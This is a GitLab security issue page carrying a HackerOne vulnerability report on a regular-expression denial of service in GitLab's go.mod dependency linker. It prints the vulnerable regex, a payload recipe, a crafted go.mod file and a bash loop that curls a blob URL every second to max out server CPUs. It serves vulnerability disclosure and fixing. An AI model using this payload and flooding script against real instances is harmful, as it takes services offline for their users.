

[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# ReDoS in gomod dependency linker

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2359528](https://hackerone.com/reports/2359528)** by `joaxcar` on 2024-02-09, assigned to [@cmaxim](/cmaxim "Costel Maxim"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

This is the regexp to check for go package paths

```
def go_package_regex
        # A Go package name looks like a URL but is not; it:
        #   - Must not have a scheme, such as http:// or https://
        #   - Must not have a port number, such as :8080 or :8443

        [@]go_package_regex ||= %r{
          \b (?# word boundary)
          (?<domain>
            [0-9a-z](?:(?:-|[0-9a-z]){0,61}[0-9a-z])? (?# first domain)
            (?:\.[0-9a-z](?:(?:-|[0-9a-z]){0,61}[0-9a-z])?)* (?# inner domains)
            \.[a-z]{2,} (?# top-level domain)
          )
          (?<path>/(?:
            [-/$_.+!*'(),0-9a-z] (?# plain URL character)
            | %[0-9a-f]{2})* (?# URL encoded character)
          )? (?# path)
          \b (?# word boundary)
        }ix
      end
```

It a quite an advanced regex, and it is vulnerable to catastrophic backtracking.

This regex is used as a part in the `gomod` linker like [this](https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/lib/gitlab/dependency_linker/go_mod_linker.rb)

```
      REGEX = Regexp.new("(?<name>#{NAME.source})(?:\\s+(?<version>v#{SEMVER.source}))?", SEMVER.options | NAME.options).freeze
```

An attacker can craft a payload of this structure

```
'a.a' + '0.0'.repeat(20000)
```

By creating a file looking like this

```
module example.com/mymodule

go 1.14

require (
    a.a0.00.00. <BIG_PAYLOAD> .00.00.0 v1.2.3
)
```

the attacker can make the GitLab instance unresponsive by sending 1 request a second to

> <https://gitlab.example.com/GROUP/PROJECT/-/blob/main/go.mod?ref_type=heads&format=json&viewer=simple>

to put all CPUs at max capacity (tested on 1K reference architecture)

##### Steps to reproduce

Use a local hosted Gitlab server

1. Log in to Gitlab
2. Create a new project (or use an existing one) make it public (for ease of attack)
3. Upload the file attached here (or create your own one named `go.mod`)

[![go.mod](data:image/gif;base64...)](https://user-content.gitlab-static.net/b482f118adbb16883e19a0228326cac9e5701c1c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64626334646630662d393561642d343332652d626363642d3433306233333937636366372f676f2e6d6f64)

4. Visit <https://gitlab.example.com/GROUP/PROJECT/-/blob/main/go.mod?ref_type=heads&format=json&viewer=simple>
5. Look in devtools that the request will eventually fail
6. To exhaust the server run this script in a terminal (change the URL)

```
###  !/bin/bash
###  URL to which the curl request will be made
URL="http://20.236.120.94/root/test/-/blob/main/go.mod?format=json&viewer=simple"

###  Duration for the loop to run: 1 minute (60 seconds)
DURATION=60

###  Start time
START_TIME=$(date +%s)

###  Loop until the duration is reached
while [ $(($(date +%s) - START_TIME)) -lt $DURATION ]; do
    # Make the curl request
    curl $URL &

    # Wait for 1 second
    sleep 1
done
```

7. SSH into the gitlab server and use `top` or `htop` to view the CPU usage

[![Screenshot_2024-02-09_at_09.04.22.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/4d95d5a5b21556c939e7773689570d0ac047cd8e/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63613136313230622d633932322d343332612d613037302d6266363732626634356139312f53637265656e73686f745f323032342d30322d30395f61745f30392e30342e32322e706e67)

##### Impact

DOS of gitlab instance and exhaustive resource consumption

##### What is the current *bug* behavior?

Creating a malicious `go.mod` file will cause REDOS

##### What is the expected *correct* behavior?

The `go.mod` file should not cause ReDos

#### Impact

DOS of gitlab instance and exhaustive resource consumption

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [go.mod](https://h1.sec.gitlab.net/a/dbc4df0f-95ad-432e-bccd-430b3397ccf7/go.mod)
* [Screenshot\_2024-02-09\_at\_09.04.22.png](https://h1.sec.gitlab.net/a/ca16120b-c922-432a-a070-bf672bf45a91/Screenshot_2024-02-09_at_09.04.22.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

